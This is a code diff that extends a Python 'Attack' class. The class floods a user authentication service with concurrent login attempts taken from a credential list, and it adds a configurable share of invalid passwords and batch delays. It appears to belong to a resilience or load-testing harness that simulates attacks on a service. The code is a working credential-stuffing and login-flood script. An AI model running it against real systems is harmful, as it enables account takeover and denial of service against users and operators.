@@ -2,10 +2,17 @@
 import threading
 import time
 import logging
+import random
 import requests
 
 
 class Attack:
+    """Credential stuffing flood targeting the user/authentication service."""
+
+    VECTOR_NAME = "credential_stuffing"
+    TARGET_SERVICE = "user"
+    RESOURCE_DIMENSIONS = ("cpu", "memory")
+
     def __init__(self, configuration, design_path, output_path, test_identifier):
         self.configuration = configuration
         self.output_path = output_path
@@ -20,22 +27,45 @@ class Attack:
                 self.credentials.append(tuple(entry.split(":", 1)))
         self.concurrency = int(float(configuration.get("attack_concurrency", 50)))
         self.timeout = float(configuration.get("attack_request_timeout_seconds", 5))
+        invalid_ratio = configuration.get("attack_invalid_credential_ratio")
+        try:
+            invalid_ratio = float(invalid_ratio)
+        except (TypeError, ValueError):
+            invalid_ratio = 0.6
+        self.invalid_ratio = min(1.0, max(0.0, invalid_ratio))
+        delay_between_batches = configuration.get("attack_login_batch_delay_seconds")
+        try:
+            self.delay_between_batches = max(0.0, float(delay_between_batches))
+        except (TypeError, ValueError):
+            self.delay_between_batches = 0.0
 
     def worker(self, end_ts, stop_event):
         session = requests.Session()
         url = f"{self.base_url}{self.login_path}"
+        headers = {"Content-Type": "application/json"}
         while (time.time() < end_ts) and (not stop_event.is_set()):
             for username, password in self.credentials:
                 if (time.time() >= end_ts) or stop_event.is_set():
                     break
                 try:
-                    session.post(url, json={"username": username, "password": password}, timeout=self.timeout)
+                    chosen_password = password
+                    if self.invalid_ratio > 0 and random.random() < self.invalid_ratio:
+                        chosen_password = f"{password}#invalid"
+                    body = {"username": username, "password": chosen_password}
+                    session.post(url, json=body, headers=headers, timeout=self.timeout)
                 except Exception:
                     # best-effort flood; ignore
                     pass
+            if self.delay_between_batches > 0:
+                stop_event.wait(timeout=self.delay_between_batches)
 
     def run(self, duration_seconds, stop_event):
-        logging.info("credential_abuse_flood: starting")
+        logging.info(
+            "credential_abuse_flood: starting (target_service=%s, invalid_ratio=%.2f, concurrency=%d)",
+            self.TARGET_SERVICE,
+            self.invalid_ratio,
+            self.concurrency,
+        )
         end_ts = time.time() + duration_seconds
         threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
         for t in threads:
@@ -44,4 +74,3 @@ class Attack:
             remaining = max(0.0, end_ts - time.time())
             t.join(timeout=remaining)
         logging.info("credential_abuse_flood: finished")
-
